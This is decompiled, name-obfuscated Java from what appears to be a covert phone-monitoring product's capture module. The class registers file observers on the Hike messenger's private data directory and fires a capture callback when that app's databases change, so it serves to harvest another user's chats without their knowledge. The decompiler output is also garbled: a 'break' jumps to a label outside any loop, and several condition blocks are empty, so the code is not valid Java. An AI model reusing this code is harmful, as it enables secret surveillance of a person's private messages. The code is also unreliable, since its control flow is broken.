package com.vvt.capture.hike.b;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.n.a.g;

public class a
  implements e, com.vvt.n.a.a, g
{
  private static final String a = a.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.e;
  private i d;
  private com.vvt.n.a.b e;
  private boolean f;
  private String g;
  private String h;
  
  public a(com.vvt.n.a.b paramb, String paramString1, String paramString2)
  {
    this.e = paramb;
    this.g = paramString1;
    this.f = false;
    this.h = paramString2;
  }
  
  public void a(i parami)
  {
    boolean bool1 = true;
    boolean bool2 = b;
    if (bool2) {}
    bool2 = this.f;
    if (!bool2)
    {
      this.f = bool1;
      this.d = parami;
      Object localObject1 = this.e;
      if (localObject1 == null) {
        break label104;
      }
      int i = 2;
      Object localObject2 = new Object[i];
      String str1 = "/data/data";
      localObject2[0] = str1;
      String str2 = "com.bsb.hike";
      localObject2[bool1] = str2;
      localObject1 = String.format("%s/%s", (Object[])localObject2);
      localObject2 = this.e;
      ((com.vvt.n.a.b)localObject2).a((String)localObject1, this);
    }
    for (;;)
    {
      bool2 = b;
      if (bool2) {}
      return;
      label104:
      bool2 = c;
      if (!bool2) {}
    }
  }
  
  public void a(String paramString)
  {
    boolean bool = b;
    if (bool) {}
    Object localObject = com.vvt.capture.hike.c.a();
    String str1 = com.vvt.capture.hike.c.b();
    if (localObject != null)
    {
      String str2 = this.g;
      String str3 = this.h;
      localObject = c.a((String)localObject, str2, str3);
      str2 = this.g;
      str3 = this.h;
      str1 = c.a(str1, str2, str3);
      bool = com.vvt.ag.b.a((String)localObject);
      if (!bool)
      {
        bool = com.vvt.ag.b.a(str1);
        if (!bool)
        {
          bool = b;
          if (bool) {}
          localObject = this.d;
          ((i)localObject).a();
        }
      }
    }
    bool = b;
    if (bool) {}
  }
  
  public void b()
  {
    boolean bool = b;
    if (bool) {}
    bool = this.f;
    if (bool)
    {
      this.f = false;
      bool = false;
      this.d = null;
      Object localObject = this.e;
      if (localObject != null)
      {
        localObject = com.vvt.capture.hike.c.a();
        com.vvt.n.a.b localb = this.e;
        localb.a((String)localObject);
      }
    }
    bool = b;
    if (bool) {}
  }
  
  public void b(String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
    String str = com.vvt.capture.hike.c.a();
    boolean bool2 = b;
    if (bool2) {}
    bool2 = com.vvt.ag.b.a(str);
    if (!bool2)
    {
      this.e.a(paramString);
      com.vvt.n.a.b localb = this.e;
      localb.a(str, this);
      bool1 = b;
      if (!bool1) {}
    }
    bool1 = b;
    if (bool1) {}
  }
  
  public void c(String paramString) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/hike/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */